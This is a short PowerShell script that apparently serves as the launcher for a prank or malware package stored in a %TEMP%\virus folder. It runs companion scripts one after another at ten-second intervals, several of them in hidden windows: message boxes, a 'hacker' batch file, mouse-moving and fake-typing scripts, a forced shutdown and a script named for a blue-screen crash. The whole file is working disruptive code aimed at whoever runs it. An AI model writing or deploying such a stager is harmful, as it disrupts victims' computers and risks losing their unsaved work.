$directory = [System.IO.Path]::Combine($env:TEMP, "virus")  # Combine %TEMP% with "virus"

# Directly open each file with specific settings and introduce a 10-second delay
Start-Process powershell.exe -ArgumentList "-File $($directory)\msgbox.ps1"
Start-Sleep -Seconds 10
Start-Process cmd.exe -ArgumentList "/c $($directory)\hacker.bat"
Start-Sleep -Seconds 10
Start-Process powershell.exe -ArgumentList "-File $($directory)\MovingMouse.ps1" -WindowStyle Hidden
Start-Sleep -Seconds 10
Start-Process wscript.exe -ArgumentList $($directory)\Typing.vbs -WindowStyle Hidden
Start-Sleep -Seconds 10
Start-Process powershell.exe -ArgumentList "-File $($directory)\shutdown.ps1" -WindowStyle Hidden
Start-Sleep -Seconds 10
Start-Process powershell.exe -ArgumentList "-File $($directory)\bsod.ps1"
Start-Sleep -Seconds 10
#done.
